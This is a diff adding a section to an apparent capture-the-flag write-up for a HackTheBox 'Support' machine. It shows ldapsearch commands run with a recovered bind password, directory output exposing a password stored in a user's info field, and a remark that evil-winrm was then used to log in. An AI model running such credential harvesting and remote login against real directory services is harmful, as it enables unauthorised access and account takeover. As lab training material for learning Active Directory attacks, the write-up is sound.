@@ -246,5 +246,62 @@ public class Example {
 
 ### LDAP query
 
+To list out all users in the domain:
+
+{% code overflow="wrap" %}
+```shell
+ldapsearch -H ldap://10.10.11.174 -D '[DOMAIN]\[USER]' -w '[PASSWORD]' -b "DC=support,DC=htb" '(objectClass=Person)'
+```
+{% endcode %}
+
+Lets look at support user's detail first. Why support? Because of the machine name and support folder in SMB.
+
+```shell
+ldapsearch -H ldap://10.10.11.174 -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "DC=support,DC=htb" '(objectClass=Person)' | grep 'sAMAccountName: support' -B36
+# support, Users, support.htb
+dn: CN=support,CN=Users,DC=support,DC=htb
+objectClass: top
+objectClass: person
+objectClass: organizationalPerson
+objectClass: user
+cn: support
+c: US
+l: Chapel Hill
+st: NC
+postalCode: 27514
+distinguishedName: CN=support,CN=Users,DC=support,DC=htb
+instanceType: 4
+whenCreated: 20220528111200.0Z
+whenChanged: 20220915030442.0Z
+uSNCreated: 12617
+info: Ironside47pleasure40Watchful
+memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
+memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
+uSNChanged: 81983
+company: support
+streetAddress: Skipper Bowles Dr
+name: support
+objectGUID:: CqM5MfoxMEWepIBTs5an8Q==
+userAccountControl: 66048
+badPwdCount: 0
+codePage: 0
+countryCode: 0
+badPasswordTime: 0
+lastLogoff: 0
+lastLogon: 0
+pwdLastSet: 132982099209777070
+primaryGroupID: 513
+objectSid:: AQUAAAAAAAUVAAAAG9v9Y4G6g8nmcEILUQQAAA==
+accountExpires: 9223372036854775807
+logonCount: 0
+sAMAccountName: support
+```
+
+Info field looks like a password. Using it to rerun the ldap query works. RDP is not open, therefore [evil-winrm](https://github.com/Hackplayers/evil-winrm) was used to connect to the machine.
+
+
+
+
+
 
 
